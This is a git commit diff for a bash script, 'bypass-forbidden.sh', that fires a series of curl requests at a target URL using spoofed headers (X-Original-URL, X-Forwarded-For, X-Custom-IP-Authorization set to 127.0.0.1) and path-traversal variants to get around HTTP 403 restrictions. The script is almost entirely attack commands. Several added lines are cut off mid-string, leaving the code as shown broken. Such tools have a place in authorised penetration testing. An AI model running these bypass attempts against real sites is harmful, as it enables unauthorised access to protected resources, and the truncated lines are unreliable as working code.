3d5f2cd89e19aa01280acd4373a6925fc397225a
OAhmed10 <78505099+OAhmed10@users.noreply.github.com>
2021-02-03 15:53:31 -0500

    Update bypass-forbidden.sh

--- bypass-forbidden.sh
+++ bypass-forbidden.sh
@@ -1,5 +1,5 @@
 #! /bin/bash
-figlet Bypass-403
+figlet Bypass-forbidden
 echo "                                               By OAhmed"
 echo "./bypass-forbidden.sh https://example.com path"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
@@ -14,11 +14,11 @@ curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
 echo "  --> ${1}/./${2}/./"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
 echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization:>
 echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://12>
 echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1>
 echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
 echo "  --> ${1} -H X-rewrite-url: ${2}"
@@ -38,9 +38,10 @@ echo "  --> ${1}/${2}#"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
 echo "  --> ${1}/${2}.json"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2\..\.\getUser
-echo "  --> ${1}/${2}\..\.\getUser
+echo "  --> ${1}/${2}\..\.\getUser"
 curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/email
-echo "  --> ${1}/${2}/email
-curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2..;/
-echo "  --> ${1}/${2}..;/
+echo "  --> ${1}/${2}/email"
+curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/??.##/
+echo "  --> ${1}/${2}/??.##/"
+
 
